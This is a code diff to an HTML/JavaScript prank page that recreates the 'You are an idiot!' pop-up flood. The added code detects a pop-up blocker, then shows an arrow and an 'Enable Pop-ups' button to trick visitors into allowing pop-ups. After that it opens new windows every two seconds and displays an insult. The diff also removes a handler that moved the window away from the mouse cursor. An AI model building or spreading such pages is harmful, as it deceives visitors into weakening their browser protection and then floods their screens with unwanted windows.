@@ -24,6 +24,11 @@
       from { opacity: 1; }
       to { opacity: 0.3; }
     }
+    #arrow {
+      display: none;
+      font-size: 5rem;
+      margin-bottom: 20px;
+    }
     #enable-popup-btn {
       display: none;
       background-color: yellow;
@@ -34,41 +39,37 @@
       cursor: pointer;
       font-weight: bold;
     }
+    #idiot-message {
+      display: none;
+    }
   </style>
 </head>
 <body>
-  <div>You are an idiot!</div>
+  <div id="arrow">↗️</div>
   <button id="enable-popup-btn" onclick="enablePopups()">Enable Pop-ups</button>
+  <div id="idiot-message">You are an idiot!</div>
 
   <script>
     // Detect if pop-ups are blocked
     function checkPopupBlocked() {
       const testWindow = window.open('', '', 'width=1,height=1');
       if (!testWindow || testWindow.closed) {
-        document.getElementById('enable-popup-btn').style.display = 'block';  // Show the button if pop-ups are blocked
+        document.getElementById('arrow').style.display = 'block';  // Show the arrow if pop-ups are blocked
+        document.getElementById('enable-popup-btn').style.display = 'block';  // Show the button to enable pop-ups
       } else {
         testWindow.close();  // Close the test window if pop-ups are allowed
+        document.getElementById('idiot-message').style.display = 'block'; // Show the message
+        setInterval(abrirMasVentanas, 2000); // Start opening multiple pop-ups every 2 seconds
       }
     }
 
     // Enable pop-ups manually by opening a new window
     function enablePopups() {
-      // Start opening multiple windows every 2 seconds
-      setInterval(abrirMasVentanas, 2000);
+      window.open('popup.html', '_blank', 'width=400,height=300'); // Open a single pop-up to enable them
+      document.getElementById('arrow').style.display = 'none'; // Hide the arrow
+      document.getElementById('idiot-message').style.display = 'block'; // Show the "You are an idiot!" message
+      setInterval(abrirMasVentanas, 2000); // Start opening multiple pop-ups every 2 seconds
     }
-
-    // Function to make the window "run away" from the mouse
-    document.addEventListener('mousemove', (event) => {
-      const distancia = 100;
-      const ventanaX = window.screenX + window.outerWidth / 2;
-      const ventanaY = window.screenY + window.outerHeight / 2;
-
-      if (Math.abs(event.screenX - ventanaX) < distancia && Math.abs(event.screenY - ventanaY) < distancia) {
-        const nuevaX = Math.floor(Math.random() * (window.screen.availWidth - window.outerWidth));
-        const nuevaY = Math.floor(Math.random() * (window.screen.availHeight - window.outerHeight));
-        window.moveTo(nuevaX, nuevaY);
-      }
-    });
 
     // Function to open more windows at random positions
     function abrirMasVentanas() {
